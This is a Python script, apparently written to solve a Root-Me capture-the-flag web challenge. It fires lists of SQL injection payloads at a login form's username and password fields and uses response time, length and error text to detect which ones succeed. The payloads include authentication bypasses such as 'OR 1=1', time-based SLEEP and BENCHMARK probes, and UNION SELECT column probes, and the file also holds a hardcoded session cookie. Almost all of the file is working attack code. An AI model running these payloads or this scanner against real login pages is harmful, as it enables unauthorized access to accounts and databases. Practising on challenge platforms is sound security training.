import requests
import time
import hashlib

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_login(payload, field="username"):
    """Prueba inyección en el login"""
    if field == "username":
        data = {
            "username": payload,
            "password": "test"
        }
    else:
        data = {
            "username": "admin",
            "password": payload
        }
    
    inicio = time.time()
    try:
        r = requests.post(f"{URL}?action=login", data=data, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        length = len(r.text)
        error = "Authentification error" in r.text
        return tiempo, length, error
    except Exception as e:
        return 0, 0, False

print("="*70)
print("  PROBANDO INYECCIÓN EN LOGIN (POST)")
print("="*70)

# Baseline
print("\n[Baseline]")
t, l, e = test_login("admin")
print(f"  Username: admin -> {t:.2f}s, Length: {l}, Error: {e}")

print("\n[Probando inyecciones en username]")
username_payloads = [
    "admin' OR '1'='1",
    "admin' OR '1'='1'-- -",
    "admin' OR 1=1-- -",
    "admin' OR 1=1#",
    "admin' OR SLEEP(5)-- -",
    "admin' OR SLEEP(5)#",
    "admin' OR IF(1=1, SLEEP(5), 0)-- -",
    "admin' OR BENCHMARK(10000000, MD5('x'))-- -",
    "admin' UNION SELECT 1,2,3-- -",
    "admin' UNION SELECT 1,2,3,4-- -",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' OR 1=1#",
    "' OR SLEEP(5)-- -",
    "' UNION SELECT 1,2,3-- -",
]

for payload in username_payloads:
    t, l, e = test_login(payload, "username")
    status = "✅" if t > 2 or e == False else "❌"
    print(f"  {status} {payload[:40]:40} -> {t:.2f}s, Length: {l}, Error: {e}")
    time.sleep(0.5)

print("\n[Probando inyecciones en password]")
password_payloads = [
    "test' OR '1'='1",
    "test' OR 1=1-- -",
    "test' OR SLEEP(5)-- -",
    "test' OR IF(1=1, SLEEP(5), 0)-- -",
    "test' UNION SELECT 1,2,3-- -",
]

for payload in password_payloads:
    t, l, e = test_login(payload, "password")
    status = "✅" if t > 2 or e == False else "❌"
    print(f"  {status} {payload[:40]:40} -> {t:.2f}s, Length: {l}, Error: {e}")
    time.sleep(0.5)
